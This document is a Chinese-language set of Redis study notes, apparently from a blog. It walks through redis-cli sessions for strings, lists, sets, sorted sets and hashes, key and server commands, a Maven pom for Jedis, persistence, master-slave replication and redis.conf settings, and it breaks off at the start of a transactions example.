3.1 字符串3.1.1 String shellString 类型是二进制安全的。意思是 Redis 的 String 可以包含任何数据。比如 jpg 图片或者序 列化的对象 。 String 类型是 Redis 最基本的数据类型，一个键最大能存储 512MB。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243如果给定了 NX 选项，那么命令仅在键 key 不存在的情况下，才进行设置操作；如果键 key 已经存 在，那么 SET ... NX 命令不做动作（不会覆盖旧值）。===&gt; not exist如果给定了 XX 选项，那么命令仅在键 key 已经存在的情况下，才进行设置操作；如果键 key 不存 在，那么 SET ... XX 命令不做动作（一定会覆盖旧值）。# 简单存取----------------------------------------------------------------------复杂度为 O(1) 。redis&gt; SET msg "hello world" OKredis&gt; GET msghello world# 删除del key1 key2 ... Keyn--------------------------------------------------------------------作用: 删除1个或多个键返回值: 不存在的key忽略掉,返回真正删除的key的数量# 给key 设置新值rename key newkey------------------------------------------------------------------------作用: 给key赋一个新的key名注:如果newkey已存在,则newkey的原值被覆盖# multi 存取----------------------------------------------------------------------# 中间的分隔符是自己指定的127.0.0.1:6379&gt; mset ss::name "airpoet" ss::age "a8" ss::like "ycy"OK127.0.0.1:6379&gt; mget ss::name ss::age ss::like1) "airpoet"2) "a8"3) "ycy"127.0.0.1:6379&gt; mset ss.age "18" ss.teacher "noone"OK127.0.0.1:6379&gt; mget ss.age ss::age1) "18"2) "a8"# msetnx----------------------------------------------------------------------只有在所有给定键都不存在的情况下， MSETNX 会为所有给定键设置值，效果和同时执行多个 SETNX 一样。如果给定的键至少有一个是存在的 ，那么 MSETNX 将不执行任何设置操作。redis&gt; MSETNX nx-1 "hello" nx-2 "world" nx-3 "good luck" 1redis&gt; SET ex-key "bad key here"OKredis&gt; MSETNX nx-4 "apple" nx-5 "banana" ex-key "cherry" nx-6 "durian" 0# 设置新值并返回旧值GETSET key new-value------------------------------------------------------------------------------------# 先设置redis&gt; SET getset-str "i'm old value"OK# 设置新的值, 返回旧值redis&gt; GETSET getset-str "i'm new value" i'm old value# 重新 get 一下, 发现已是新值redis&gt; GET getset-str i'm new value#追加内容到字符串末尾APPEND key value------------------------------------------------------------------------------------redis&gt; SET myPhone "nokia" OKredis&gt; APPEND myPhone "-1110" (integer) 10redis&gt; GET myPhone "nokia-1110"#返回值的长度------------------------------------------------------------------------------------redis&gt; SET msg "hello" OK redis&gt; STRLEN msg (integer) 5 redis&gt; APPEND msg " world" (integer) 11 redis&gt; STRLEN msg (integer) 11==========================================================================================# 索引-------------------------------------------------------------------------------------$ 如果字符串长度为 n从左到右&gt;&gt; 0 ~ n-1从右到做&gt;&gt; -1 ~ -n # 范围设置SETRANGE key index value-------------------------------------------------------------------------------------从索引 index 开始，用 value 覆写(overwrite)给定键 key 所储存的字符串值。只接受正数索引。redis&gt; SET msg "hello"OKredis&gt; SETRANGE msg 1 "appy" (integer) 5redis&gt; GET msg "happy"# 范围取值GETRANGE key start end-------------------------------------------------------------------------------------返回键 key 储存的字符串值中，位于 start 和 end 两个索引之间的内容(闭区间，start 和 end 会被包括 在内)。和 SETRANGE 只接受正数索引不同， GETRANGE 的索引可以是正数或者 负数。redis&gt; SET msg "hello world"OKredis&gt; GETRANGE msg 0 4 "hello"# 从后往前取范围, 依然是从左往右(从前往后)读的redis&gt; GETRANGE msg -5 -1 "world"==========================================================================================# 数字操作-------------------------------------------------------------------------------------只要储存在字符串键里面的值可以被解释为 64 位整数，或者 IEEE-754 标准的 64 位浮点数，那么用户就可以对这个字符串键执行针对数字值的命令。 # 增加或者减少数字的值 INCRBY, DECRBY可实现案例: 计数器(counter), id 生成器 # 键 num 不存在，命令先将 num 的值初始化为 0 ,然后再执行加 100 操作 redis&gt; INCRBY num 100 (integer) 100 redis&gt; DECRBY num 50 (integer) 50 # 浮点数的自增和自减INCRBYFLOAT key increment减的话 用负数-------------------------------------------------------------------------------------redis&gt; SET num 10OKredis&gt; INCRBYFLOAT num 3.14 "13.14"redis&gt; INCRBYFLOAT num -2.04 "11.1"即使字符串键储存的是数字值，它也可以执行 APPEND、STRLEN、SETRANGE 和 GETRANGE当用户针对一个数字值执行这些命令的时候，Redis 会先将数字值转换为字符串，然后再执行命令。 ==========================================================================================# 二进制的操作索引是从右往左递增 具体查看应用案例: 实现在线人数统计应用案例: 使用 Redis 缓存热门图片(二进制)https://app.yinxiang.com/shard/s37/nl/7399077/92dcb5fb-c005-45dc-bcc5-d00863c08f84/==========================================================================================# 储存中文时的注意事项--------------------------------------------一个英文字符只需要使用 单个字节来储存，而一个中文字符却需要使用多个字 节来储存。STRLEN、SETRANGE 和 GETRANGE 都是为英文设置的，它们只会在字符为单个字节的情况下正常 工作，而一旦我们储存的是类似中文这样的多字节字符，那么这三个命令就不再适用了。# 在 redis-cli 中使用中文时，必须打开 --raw 选项，才能正常显示中文$ redis-cli --raw$ redis&gt; SET msg "世界你好" OK$ redis&gt; GET msg 世界你好# strlen 只能获取字节$redis&gt; STRLEN msg 12==========================================================================================# 移动库move key db(注意: 一个redis进程,打开了不止一个数据库, 默认打开16个数据库,从0到15编号,如果想打开更多数据库,可以从配置文件修改)---------------------------------------------------------------------------redis 127.0.0.1:6379[1]&gt; select 2OKredis 127.0.0.1:6379[2]&gt; keys *(empty list or set)redis 127.0.0.1:6379[2]&gt; select 0OKredis 127.0.0.1:6379&gt; keys *1) "name"2) "cc"3) "a"4) "b"# 移动key 到其它的库redis 127.0.0.1:6379&gt; move cc 2(integer) 1redis 127.0.0.1:6379&gt; select 2OKredis 127.0.0.1:6379[2]&gt; keys *1) "cc"redis 127.0.0.1:6379[2]&gt; get cc"3"# 插入和读取一条 String 类型的数据127.0.0.1:6379&gt; set name huangboOK127.0.0.1:6379&gt; get name"huangbo"127.0.0.1:6379&gt;------------------------#对 string 类型数据进行增减（前提是这条数据的 value 可以看成数字）127.0.0.1:6379&gt; set number 10OK127.0.0.1:6379&gt; incr number(integer) 11127.0.0.1:6379&gt; decr number(integer) 10127.0.0.1:6379&gt; incrby number 10(integer) 20127.0.0.1:6379&gt; decrby number 5(integer) 15------------------------# 一次性插入或者获取多条数据127.0.0.1:6379&gt; mset name huangbo age 18 facevalue 99OK127.0.0.1:6379&gt; mget name age facevalue1) "huangbo"2) "18"3) "99"------------------------# 在插入一条 string 类型数据的同时为它指定一个存活期限解释: 表示 yu 的 jiyi 只有 7s，7s 之后会自动清除这个 key-value127.0.0.1:6379&gt; setex yu 7 jiyiOK127.0.0.1:6379&gt; get yu"jiyi"127.0.0.1:6379&gt; get yu(nil) 3.1.2 String 使用案例见 github 3.2 list 3.2.1 List常用操作示例1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071# 从头部（左边left）插入数据127.0.0.1:6379&gt; lpush names huangbo xuzheng wangbaoqiang(integer) 3127.0.0.1:6379&gt; lrange names 0 -11) "wangbaoqiang"2) "xuzheng"3) "huangbo"# 从尾部（右边right）插入数据127.0.0.1:6379&gt; rpush names ycy cy y(integer) 6# 读取 list 中指定范围的 values ==&gt; 好像不支持负数索引 ??==&gt; 索引是闭区间127.0.0.1:6379&gt; lrange names 0 -11) "wangbaoqiang"2) "xuzheng"3) "huangbo"4) "ycy"5) "cy"6) "y"127.0.0.1:6379&gt; LRANGE names 0 01) "wangbaoqiang"# 从头部(前面)弹出一个元素127.0.0.1:6379&gt; lpop names"wangbaoqiang"127.0.0.1:6379&gt; LRANGE names 0 -11) "xuzheng"2) "huangbo"3) "ycy"4) "cy"5) "y"# 从尾部(最后right)弹出一个元素127.0.0.1:6379&gt; rpop names"y"127.0.0.1:6379&gt; LRANGE names 0 -11) "xuzheng"2) "huangbo"3) "ycy"4) "cy"# 从前面 list 的尾部(right)弹出(pop)一个元素 压入(push)到 后面 list的 头部(left) -----------------------------------127.0.0.1:6379&gt; LRANGE names 0 -11) "xuzheng"2) "huangbo"3) "ycy"4) "cy"127.0.0.1:6379&gt; LRANGE nickname 0 -11) "YangChaoyue"2) "WuXuanyi"3) "MengMeiqi"127.0.0.1:6379&gt;  RPOPLPUSH names nickname "cy"127.0.0.1:6379&gt; LRANGE nickname 0 -11) "cy"2) "YangChaoyue"3) "WuXuanyi"4) "MengMeiqi"127.0.0.1:6379&gt; LRANGE names 0 -11) "xuzheng"2) "huangbo"3) "ycy"# 求 list 的长度 3.2.2 list应用案例代码见 github 3.3 Set 集合3.3.1 Set 的 shell 使用Redis 的 Set 是 string 类型的无序集合。 集合是通过哈希表实现的，所以添加，删除，查找的复杂度都是 O(1)。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384# 插入 set 数据 &amp; 查询 set 数据127.0.0.1:6379&gt; sadd bigdata hadoop spark hive(integer) 3127.0.0.1:6379&gt; scard bigdata(integer) 3127.0.0.1:6379&gt; smembers bigdata1) "hadoop"2) "spark"3) "hive"# 判断一个成员是否属于某条指定的 set 数据127.0.0.1:6379&gt; sismember bigdata hbase(integer) 0127.0.0.1:6379&gt; sismember bigdata hive(integer) 1# 求两个 set 数据的差集$ setdiff [set1] [set2]&gt; 删除 set1 中 set1,set2的交集, 返回删除操作后的 set1(对 set1 的真实存储不影响)127.0.0.1:6379&gt; SMEMBERS bigdata1) "hadoop"2) "spark"3) "hive"127.0.0.1:6379&gt; SMEMBERS bigdata21) "hbase"2) "spark"3) "storm"127.0.0.1:6379&gt; sdiff bigdata bigdata21) "hadoop"2) "hive"# 将上面2者的差集, 存入一个新的 set127.0.0.1:6379&gt; sdiffstore bigdatadiff bigdata bigdata2(integer) 2127.0.0.1:6379&gt; SMEMBERS bigdatadiff1) "hadoop"2) "hive"# 求交集 &amp; 存入新的集合127.0.0.1:6379&gt; SMEMBERS bigdata1) "hadoop"2) "spark"3) "hive"127.0.0.1:6379&gt; SMEMBERS bigdata21) "hbase"2) "spark"3) "storm"127.0.0.1:6379&gt; SINTER bigdata bigdata21) "spark"127.0.0.1:6379&gt; SINTERSTORE interdb bigdata bigdata2(integer) 1127.0.0.1:6379&gt; SMEMBERS interdb1) "spark"# 求并集 sunion127.0.0.1:6379&gt; SMEMBERS bigdata1) "hadoop"2) "spark"3) "hive"127.0.0.1:6379&gt; SMEMBERS bigdata21) "hbase"2) "spark"3) "storm"# 返回并集127.0.0.1:6379&gt; sunion bigdata bigdata21) "hadoop"2) "spark"3) "hive"4) "storm"5) "hbase"# 存储并集127.0.0.1:6379&gt; SUNIONSTORE uniondb bigdata bigdata2(integer) 5127.0.0.1:6379&gt; SMEMBERS uniondb1) "hadoop"2) "spark"3) "hive"4) "storm"5) "hbase" 3.3.2 set 使用案例见 github 3.4 ZSet–有序集合Zset 和 Set 一样也是 String 类型元素的集合，且不允许重复的成员。 不同的是每个元素都会关联一个 double 类型的分数。Redis 正是通过分数来为集合中的成员 进行从小到大的排序。 Zset 的成员是唯一的，但分数(score)却可以重复。 3.4.1 zset shell操作1234567891011121314151617181920212223242526272829303132333435363738394041424344# 往 redis 库中插入一条 sortedset 数据# 注意: sco在前面(float), 可重复, 'value'不可重复$ zadd [zset名] sco 'value'127.0.0.1:6379&gt; zadd yanzhi 70 huangbo 90 xuzheng 80 wangbaoqiang(integer) 3# 升序排列127.0.0.1:6379&gt; zrange yanzhi 0 41) "huangbo"2) "wangbaoqiang"3) "xuzheng"# 降序排列127.0.0.1:6379&gt; zrevrange yanzhi 0 41) "xuzheng"2) "wangbaoqiang"3) "huangbo"# 查询某个成员的名次127.0.0.1:6379&gt; zrevrange yanzhi 0 41) "xuzheng"2) "wangbaoqiang"3) "huangbo"127.0.0.1:6379&gt; zrank yanzhi huangbo(integer) 0127.0.0.1:6379&gt; zrank yanzhi wangbaoqiang(integer) 1127.0.0.1:6379&gt; zrank yanzhi xuzheng(integer) 2#修改成员的分数zincrby yanzhi 50 huangbo"120"127.0.0.1:6379&gt; ZRANGE yanzhi 0 -11) "wangbaoqiang"2) "xuzheng"3) "huangbo"$ zrevrank 返回 huangbo 的 yanzhi 排名 $ 'value' huangbo 不能重复, 对应的分数可以重复127.0.0.1:6379&gt; zrevrank yanzhi huangbo(integer) 0 3.4.2 案例Lol 盒子英雄数据排行榜： 1、在 redis 中需要一个榜单所对应的 sortedset 数据 2、玩家每选择一个英雄打一场游戏，就对 sortedset 数据的相应的英雄分数+1 3、Lol 盒子上查看榜单时，就调用 zrange 来看榜单中的排序结果 代码见 github 3.5 散列 – Hash– 哈希表一个散列由多个域值对(field-value pair)组成，散列的键和值都可以是文字、整数、浮点数或者二 进制数据。 同一个散列里面的各个域必 须是独一无二的，但不同域的 值可以是重复的。 尽量使用散列键而不是字符串键来储存键值对数据，因为散列键管理方便、能够避免键名冲突、并且还能够节约内存。 Redis Hash 是一个键值对集合。 Redis Hash 类型可以看成具有 String Key 和 String Value 的 map 容器 Redis Hash 是一个 String 类型的 field 和 value 的映射表，Hash 特别适合用于存储对象。 3.5.1 shell 操作123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119# 散列(hash)类似于 HashMap一个散列由多个域 值对(field-value pair)组成，散列的域和值都可以是文字、整数、浮点数或者二 进制数据同一个散列里面的每个域必 须是独一无二、各不相同 的，而域的值则没有这一要求，换句话说，不同域的值 可以是重的。#关联域值对HSET key field valueHGET key field:TODO 真正的 kv 是 f v, 那设置这个 key 干嘛的? ? 👌===&gt; key 是散列名称, 比如 散列 message 的 field-value pair 是"sender" "peter" -------------------------------------------------------------------------------------redis&gt; HSET message "id" 10086 (integer) 1redis&gt; HSET message "sender" "peter" (integer) 1redis&gt; HSET message "receiver" "jack" (integer) 1==========================================================================================#一次设置或获取散列中的多个域值对HMSET key field value [field value ...]HMGET key field [field ...]redis&gt; HMSET message "id" 10086 "sender" "peter" "receiver" "jack"OKredis&gt; HMGET message "id" "sender" "receiver"1) "10086"2) "peter"3) "jack"#获取散列包含的所有域、值、或者域值对HKEYS key =&gt; 返回散列键 key 包含的所有域。HVALS key =&gt; 返回散列键 key 中，所有域的值。HGETALL key =&gt; 返回散列键 key 包含的所有域值对。redis&gt; HKEYS message 1) "id"2) "sender"3) "receiver"4) "date"5) "content"redis&gt; HVALS message 1) "10086"2) "peter"3) "jack"4) "2014-8-3 3:25 p.m." 5) "Good morning, jack!"redis&gt; HGETALL message1) "id" #域2) "10086" #值3) "sender" #域4) "peter" #值5) "receiver"6) "jack"7) "date"8) "2014-8-3 3:25 p.m." 9) "content"10) "Good morning, jack!"================================================================# hset , hget , hgetall127.0.0.1:6379&gt; hset shouji iphone 8(integer) 1127.0.0.1:6379&gt; hset shouji xiaomi 7(integer) 1127.0.0.1:6379&gt; hset shouji huawei p20(integer) 1127.0.0.1:6379&gt; hgetall shouji1) "iphone"2) "8"3) "xiaomi"4) "7"5) "huawei"6) "p20"127.0.0.1:6379&gt; hget shouji huawei"p20"# 取出 hash 数据中所有 fields / values127.0.0.1:6379&gt; hkeys shouji1) "iphone"2) "xiaomi"3) "huawei"127.0.0.1:6379&gt; hvals shouji1) "8"2) "7"3) "p20"# 为 hash 数据中指定的一个 field 的值进行增减127.0.0.1:6379&gt; hincrby shouji xiaomi 10(integer) 17127.0.0.1:6379&gt; hget shouji xiaomi"17"# 从 hash 数据中删除一个字段 field 及其值127.0.0.1:6379&gt; HGETALL shouji1) "iphone"2) "8"3) "xiaomi"4) "17"5) "huawei"6) "p20"127.0.0.1:6379&gt; hdel shouji iphone(integer) 1127.0.0.1:6379&gt; HGETALL shouji1) "xiaomi"2) "17"3) "huawei"4) "p20" 3.5.2 案例: 实现购物车 需求点： 加入购物车 查询购物车 修改购物车 清空购物车 代码见 github 3.6 键值相关命令 shell简单实用123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101# 查询所有 cart 开头的 key127.0.0.1:6379&gt; keys cart*1) "cart:huangbo"2) "cart:xuzheng"3) "cart:wangbaoqiang"# 查询所有 key127.0.0.1:6379&gt; keys * 1) "bigdata:hadoop" 2) "uniondb" 3) "myset" 4) "cart:huangbo" 5) "bigdata:spark" ..... # 判断一个 key 是否存在 exists 127.0.0.1:6379&gt; EXISTS bigdata(integer) 1# del 删除一个或多个 key127.0.0.1:6379&gt; del facevalue(integer) 1# type 查看类型, 便于针对类型操作127.0.0.1:6379&gt; type bigdataset127.0.0.1:6379&gt; SMEMBERS bigdata1) "hadoop"2) "spark"3) "hive"# expire [key] second 设置一个 key 的过期时间, 单位是秒127.0.0.1:6379&gt; type nameslist127.0.0.1:6379&gt; lrange names 0 -11) "xuzheng"2) "huangbo"3) "ycy"$ 127.0.0.1:6379&gt; expire names 5(integer) 1127.0.0.1:6379&gt; lrange names 0 -11) "xuzheng"2) "huangbo"3) "ycy"$ 127.0.0.1:6379&gt; lrange names 0 -1(empty list or set)# expireat [key] timestamp 设置在时间戳 timestamp 过期# ttl [key] 查询 key 的有效时长, 不存在或没有超时设置, 返回 -1127.0.0.1:6379&gt; ttl bigdata(integer) -1# move [key] database 将当前库中的 key 移动到其它数据库中# 默认是有16个 databases 0-15127.0.0.1:6379&gt; move bigdata 2(integer) 1127.0.0.1:6379&gt; type bigdatanone127.0.0.1:6379&gt; SMEMBERS bigdata(empty list or set)127.0.0.1:6379&gt; SELECT 2OK127.0.0.1:6379[2]&gt; keys *1) "bigdata"127.0.0.1:6379[2]&gt; SMEMBERS bigdata1) "hadoop"2) "spark"3) "hive"# 移除给定key 的过期时间127.0.0.1:6379[2]&gt; keys *1) "bigdata"127.0.0.1:6379[2]&gt; expire bigdata 100(integer) 1127.0.0.1:6379[2]&gt; ttl bigdata(integer) 96127.0.0.1:6379[2]&gt; persist bigdata(integer) 1127.0.0.1:6379[2]&gt; ttl bigdata(integer) -1# 随机获取 key空间中的一个127.0.0.1:6379&gt; randomkey"student_tang"# 重命名 key127.0.0.1:6379&gt; zrange yanzhi 0 -11) "wangbaoqiang"2) "xuzheng"3) "huangbo"127.0.0.1:6379&gt; rename yanzhi shuiMaOK127.0.0.1:6379&gt; zrange shuiMa 0 -11) "wangbaoqiang"2) "xuzheng"3) "huangbo"# renamenx [key] newkey 如果 newkey 存在, 则失败返回0# type [key] 查询 key 的类型 3.7 服务器相关命令 简单测试12345678910111213141516171819202122232425262728293031# 选择数据库 (redis 默认数据库编号 0-15)127.0.0.1:6379&gt; select 3OK# quit退出# echo msg 发现不能有空格127.0.0.1:6379[3]&gt; echo 要吐了"\xe8\xa6\x81\xe5\x90\x90\xe4\xba\x86"127.0.0.1:6379[3]&gt; echo iFellSick"iFellSick"# dbsize 返回当期那数据库中的 key 的条数127.0.0.1:6379[3]&gt; select 0OK127.0.0.1:6379&gt; DBSIZE(integer) 23# flushdb 删除当前选择数据库中的所有key127.0.0.1:6379[2]&gt; dbsize(integer) 1127.0.0.1:6379[2]&gt; keys *1) "bigdata"127.0.0.1:6379[2]&gt; flushdbOK127.0.0.1:6379[2]&gt; keys *(empty list or set)# flushall 删除所有数据库中的所有的 key 3.8 pom 文件1234567891011121314151617181920212223242526272829303132&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;groupId&gt;com.rox&lt;/groupId&gt; &lt;artifactId&gt;Redis_Demo&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;redis.clients&lt;/groupId&gt; &lt;artifactId&gt;jedis&lt;/artifactId&gt; &lt;version&gt;2.9.0&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.google.code.gson&lt;/groupId&gt; &lt;artifactId&gt;gson&lt;/artifactId&gt; &lt;version&gt;2.8.0&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;junit&lt;/groupId&gt; &lt;artifactId&gt;junit&lt;/artifactId&gt; &lt;version&gt;4.12&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/project&gt; 5. Redis高可用在 Redis 中，实现高可用的技术主要包括持久化、复制、哨兵和集群 第一：持久化 持久化是最简单的高可用方法(有时甚至不被归为高可用的手段)，主要作用是数据备份， 即将数据存储在硬盘，保证数据不会因进程退出而丢失。 第二：主从复制 复制是高可用 Redis 的基础，哨兵和集群都是在复制基础上实现高可用的。复制主要实现 了数据的多机备份，以及对于读操作的负载均衡和简单的故障恢复。缺陷：故障恢复无 法自动化；写操作无法负载均衡；存储能力受到单机的限制。 第三：哨兵 哨兵在复制的基础上，哨兵实现了自动化的故障恢复。缺陷：写操作无法负载均衡；存 储能力受到单机的限制。 第四：集群 通过集群，Redis 解决了写操作无法负载均衡，以及存储能力受到单机限制的问题，实现 了较为完善的高可用方案。 5.1 Redis 持久化Redis 持久化分为 RDB 持久化和 AOF 持久化： RDB：将当前数据保存到硬盘 AOF：将每次执行的写命令保存到硬盘（类似于 MySQL 的 binlog） 由于 AOF 持久化的实时性更好，即当进程意外退出时丢失的数据更少，因此 AOF 是目前主 流的持久化方式，不过 RDB 持久化仍然有其用武之地。 5.1.1 RDB 手动方式 save save 命令会阻塞 Redis 服务器进程，直到 RDB 文件创建完毕为止 bgsave bgsave 命令会创建一个子进程，由子进程来负责创建 RDB 文件，父进程(即 Redis 主 进程)则继续处理请求。 自动触发 在配置文件redis.conf中配置 save m n save 900 1 save 300 10 save 60 10000 #900 秒内如果超过 1 个 key 被修改，则发起快照保存 #300 秒内容如超过 10 个 key 被修改，则发起快照保存 #60 秒内容如超过 10000 个 key 被修改，则发起快照保存 5.1.2 AOF 方式AOF 比快照方式有更好的持久化性，是由于在使用 AOF 持久化方式时，Redis 会将每一个收 到的写命令都通过 write 函数追加到文件中(默认是 appendonly.aof)。当 Redis 重启时会通过 重新执行文件中保存的写命令来在内存中重建整个数据库的内容。 我们可以通过配置文件告诉 redis 我们想要 通过 fsync 函数强制 os 写入到磁盘的时机。 三种方式如下（默认是：每秒 fsync 一次）： 5.2 Redis 主从复制Redis 主从复制配置和使用都非常简单。通过主从复制可以允许多个 slave server 拥有和 master server 相同的数据库副本。下面是关于 redis 主从复制的一些特点： 1、master 可以有多个 slave 2、除了多个 slave 连到相同的 master 外，slave 也可以连接其他 slave 形成图状结构 3、主从复制不会阻塞 master。也就是说当一个或多个 slave 与 master 进行初次同步数据时， master 可以继续处理 client 发来的请求。相反 slave 在初次同步数据时则会阻塞不能处理 client 的请求。 4、主从复制可以用来提高系统的可伸缩性,我们可以用多个 slave 专门用于 client 的读请求， 比如 sort 操作可以使用 slave 来处理。也可以用来做简单的数据冗余 5、可以在 master 禁用数据持久化，只需要注释掉 master 配置文件中的所有 save 配置，然 后只在 slave 上配置数据持久化。 主从复制的过程当设置好 slave 服务器后，slave 会建立和 master 的连接，然后发送 sync 命令。 无论是第一 次同步建立的连接还是连接断开后的重新连接，master 都会启动(fork)一个后台进程，将数 据库快照保存到文件中（fork 一个进程入内在也被复制了，即内存会是原来的两倍），同时 master 主进程会开始收集新的写命令并缓存起来。 后台进程完成写文件后，master 就发送 文件给 slave，slave 将文件保存到磁盘上，然后加载到内存恢复数据库快照到 slave 上。 接着 master 就会把缓存的命令转发给 slave。 而且后续 master 收到的写命令都会通过开始建立 的连接发送给 slave。 从 master 到 slave 的同步数据的命令和从 client 发送的命令使用相同的 协议格式。 当 master 和 slave 的连接断开时 slave 可以自动重新建立连接。 如果 master 同时 收到多个 slave 发来的同步连接命令，只会使用启动一个进程来写数据库镜像，然后发送给 所有 slave。 配置 slave 服务器只需要在配置文件中加入如下配置： slaveof cs1 6379 #指定 master 的 ip 和端口 注意：主节点不用加！！！ 6.Redis.conf配置文件参数说明redis.conf 配置项说明如下： 1、Redis 默认不是以守护进程的方式运行，可以通过该配置项修改，使用 yes 启用守护进 程 daemonize no 2、当 Redis 以守护进程方式运行时，Redis 默认会把 pid 写入/var/run/redis.pid 文件，可以 通过 pidfile 指定 pidfile /var/run/redis.pid 3、指定 Redis 监听端口，默认端口为 6379，作者在自己的一篇博文中解释了为什么选用 6379 作为默认端口，因为 6379 在手机按键上 MERZ 对应的号码，而 MERZ 取自意大利歌 女 Alessia Merz 的名字 port 6379 4、绑定的主机地址 bind 127.0.0.1 5、当客户端闲置多长时间后关闭连接，如果指定为 0，表示关闭该功能 timeout 300 6、指定日志记录级别，Redis 总共支持四个级别：debug、verbose、notice、warning，默 认为 verbose loglevel verbose 7、日志记录方式，默认为标准输出，如果配置 Redis 为守护进程方式运行，而这里又配 置为日志记录方式为标准输出，则日志将会发送给/dev/null logfile stdout 8、设置数据库的数量，默认数据库为 0，可以使用 SELECT 命令在连接上指定数据 库 id databases 16 9、指定在多长时间内，有多少次更新操作，就将数据同步到数据文件，可以多个条件配 合 save \&lt;seconds> \&lt;changes> Redis 默认配置文件中提供了三个条件： save 900 1 save 300 10 save 60 10000 分别表示 900 秒（15 分钟）内有 1 个更改，300 秒（5 分钟）内有 10 个更改以及 60 秒 内有 10000 个更改。 10、指定存储至本地数据库时是否压缩数据，默认为 yes，Redis 采用 LZF 压缩，如果为了 节省 CPU 时间，可以关闭该选项，但会导致数据库文件变的巨大 rdbcompression yes 11、指定本地数据库文件名，默认值为 dump.rdb dbfilename dump.rdb 12、指定本地数据库存放目录 dir ./ 13、设置当本机为 slave 服务时，设置 master 服务的 IP 地址及端口，在 Redis 启动时，它 会自动从 master 进行数据同步 slaveof \&lt;masterip> \&lt;masterport> 14、当 master 服务设置了密码保护时，slav 服务连接 master 的密码 masterauth \&lt;master-password> 15、设置 Redis 连接密码，如果配置了连接密码，客户端在连接 Redis 时需要通过 AUTH \&lt;password>命令提供密码，默认关闭 requirepass foobared 16、设置同一时间最大客户端连接数，默认无限制，Redis 可以同时打开的客户端连接数 为 Redis 进程可以打开的最大文件描述符数，如果设置 maxclients 0，表示不作限制。当 客户端连接数到达限制时，Redis 会关闭新的连接并向客户端返回 max number of clients reached 错误信息 maxclients 128 17、指定 Redis 最大内存限制，Redis 在启动时会把数据加载到内存中，达到最大内存后， Redis 会先尝试清除已到期或即将到期的 Key，当此方法处理 后，仍然到达最大内存设置， 将无法再进行写入操作，但仍然可以进行读取操作。Redis 新的 vm 机制，会把 Key 存放 内存，Value 会存放在 swap 区 maxmemory \&lt;bytes> 18、指定是否在每次更新操作后进行日志记录，Redis 在默认情况下是异步的把数据写入 磁盘，如果不开启，可能会在断电时导致一段时间内的数据丢失。因为 redis 本身同步数 据文件是按上面 save 条件来同步的，所以有的数据会在一段时间内只存在于内存中。默 认为 no appendonly no 19、指定更新日志文件名，默认为 appendonly.aof appendfilename appendonly.aof 20、指定更新日志条件，共有 3 个可选值： no：表示等操作系统进行数据缓存同步到磁盘（快） always：表示每次更新操作后手动调用 fsync()将数据写到磁盘（慢，安全） everysec：表示每秒同步一次（折衷，默认值） appendfsync everysec 21、指定是否启用虚拟内存机制，默认值为 no，简单的介绍一下，VM 机制将数据分页 存放，由 Redis 将访问量较少的页即冷数据 swap 到磁盘上，访问多的页面由磁盘自动换 出到内存中（在后面的文章我会仔细分析 Redis 的 VM 机制） vm-enabled no 22、虚拟内存文件路径，默认值为/tmp/redis.swap，不可多个 Redis 实例共享 vm-swap-file /tmp/redis.swap 23、将所有大于 vm-max-memory 的数据存入虚拟内存,无论 vm-max-memory 设置多小,所 有索引数据都是内存存储的(Redis 的索引数据 就是 keys),也就是说,当 vm-max-memory 设 置为 0 的时候,其实是所有 value 都存在于磁盘。默认值为 0 vm-max-memory 0 24、Redis swap 文件分成了很多的 page，一个对象可以保存在多个 page 上面，但一个 page 上不能被多个对象共享，vm-page-size 是要根据存储的 数据大小来设定的，作者建议如 果存储很多小对象，page 大小最好设置为 32 或者 64bytes；如果存储很大大对象，则可 以使用更大的 page，如果不 确定，就使用默认值 vm-page-size 32 25、设置 swap 文件中的 page 数量，由于页表（一种表示页面空闲或使用的 bitmap）是 在放在内存中的，，在磁盘上每 8 个 pages 将消耗 1byte 的内存。 vm-pages 134217728 26、设置访问 swap 文件的线程数,最好不要超过机器的核数,如果设置为 0,那么所有对 swap 文件的操作都是串行的，可能会造成比较长时间的延迟。默认值为 4 vm-max-threads 4 27、设置在向客户端应答时，是否把较小的包合并为一个包发送，默认为开启 glueoutputbuf yes 28、指定在超过一定的数量或者最大的元素超过某一临界值时，采用一种特殊的哈希算 法 hash-max-zipmap-entries 64 hash-max-zipmap-value 512 29、指定是否激活重置哈希，默认为开启（后面在介绍 Redis 的哈希算法时具体介绍） activerehashing yes 30、指定包含其它的配置文件，可以在同一主机上多个 Redis 实例之间使用同一份配置文 件，而同时各个实例又拥有自己的特定配置文件 include /path/to/local.conf 7.其它需要了解的添加注释的技巧: 最好的注释方式: 少而精 完成一段小逻辑的代码就加个注释 容易费解的地方加注释 拓展: 缓存淘汰算法 :TODONRU(Not recently used) FIFO(First-in, first-out) Second-chance LRU(Least recently Used) redis 的内存模型 Hadoop3.0 新特性机制 纠删码 机制 事务 1234567891011121314151617181920212223242526272829303132# 基本操作127.0.0.1:6379&gt; multiOK127.0.0.1:6379&gt; set a 1QUEUED127.0.0.1:6379&gt; set b 